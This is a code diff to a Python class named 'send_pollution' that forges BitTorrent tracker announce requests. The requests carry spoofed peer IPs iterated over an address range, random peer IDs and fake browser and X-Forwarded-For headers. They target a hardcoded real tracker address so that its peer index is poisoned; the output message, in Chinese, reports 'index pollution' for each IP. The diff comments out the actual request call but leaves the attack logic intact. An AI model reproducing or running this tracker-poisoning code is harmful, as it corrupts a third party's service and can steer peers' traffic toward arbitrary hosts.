@@ -31,10 +31,10 @@ class send_pollution:
         :param min_ip:
         :return:
         '''
-        for i in range(100,110):
-            newip = str(i) + "." + str(i) + "." + str(i) + "." + '0'
+        while self.bigger(max_ip,min_ip):
+            newip = str(min_ip[0]) + "." + str(min_ip[1]) + "." + str(min_ip[2]) + "." + str(min_ip[3])
             peer_id = '-qB4250-' + generate_random_str(12)
-            url = "http://93.158.213.92:1337/announce?info_hash=%ceb6%be%c49x%16%b8%89G%92%ad2%a1%99F%9e%ba%80&peer_id="+peer_id+"&ip="+newip+"&port=40000&uploaded=0&downloaded=21511128&left=0&corrupt=0&key=A004ACC7&event=started&numwant=200&compact=1&no_peer_id=1&supportcrypto=1&redundant=0HTTP/1.1\r\n"
+            url = "http://93.158.213.92:1337/announce?info_hash=%ceb6%be%c49x%16%b8%89G%92%ad2%a1%99F%9e%ba%80&peer_id=" + peer_id + "&ip=" + newip + "&port="+port+"&uploaded=0&downloaded=21511128&left=0&corrupt=0&key=A004ACC7&event=started&numwant=200&compact=1&no_peer_id=1&supportcrypto=1&redundant=0HTTP/1.1\r\n"
             fake_headers = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0',
                 'Accept': '*/*',
@@ -43,9 +43,21 @@ class send_pollution:
                 'X-Forwarded-For': '1.1.1.1'
             }
             request_announce = request.Request(url=url, headers=fake_headers)
-            print(request_announce.headers)
-            response_announce = request.urlopen(request_announce)
+            print(url)
+            output_text.append("对tracker添加IP为"+newip+"的索引污染")
+            # response_announce = request.urlopen(request_announce)
+            for i in range(3, -1, -1):
+                if min_ip[i] < 255:
+                    min_ip[i] = min_ip[i]+1
+                    break
 
+
+    def bigger(self, ip1, ip2):
+        for i in range(4):
+            if ip1[i] > ip2[i]:
+                return True
+            elif ip1[i] < ip2[i]:
+                return False
 
 def generate_random_str(randomlength=16):
     """
@@ -59,5 +71,5 @@ def generate_random_str(randomlength=16):
 
 
 if __name__ == '__main__':
-    send_pollution().send_http_announce('93.158.213.92')
+    send_pollution().send_http_announce('93.158.213.92', '1337', [200, 200, 200, 0], [200, 200, 200, 200], '50000', ["ds"])
 
